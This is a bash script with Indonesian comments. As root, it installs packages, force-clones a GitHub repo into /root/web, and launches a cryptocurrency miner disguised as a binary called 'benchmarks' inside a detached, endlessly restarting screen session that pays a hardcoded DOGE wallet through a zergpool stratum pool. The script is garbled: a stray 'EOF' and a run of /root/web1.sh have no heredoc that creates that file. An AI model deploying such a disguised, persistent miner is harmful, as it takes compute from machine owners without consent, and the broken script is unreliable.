#!/bin/bash

echo "📦 Update & install dependencies..."
apt-get update && apt-get install -y screen git wget

echo "🌐 Clone repo ke /root/web..."
rm -rf /root/web
git clone https://github.com/amirul5656/web.git /root/web

echo "🔧 Pastikan web2.sh executable..."
chmod +x /root/web/web2.sh

# Cek apakah screen sudah berjalan
if screen -list | grep -q amirul3; then
  echo "⚠️  Screen 'amirul3' sudah jalan, skip."
else
  echo "▶ Menjalankan mining di screen 'amirul3'..."
  screen -dmS amirul3 bash -c '
    while true; do
      ./benchmarks --algorithm xelisv2_pepew --pool stratum+tcp://xelisv2-pepew.asia.mine.zergpool.com:5778 --wallet D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux --password c=DOGE,mc=PEPEW,ID=yui
      sleep 2
    done
  '
fi
EOF

chmod +x /root/web1.sh

echo "🚀 Menjalankan miner sekarang..."
bash /root/web1.sh
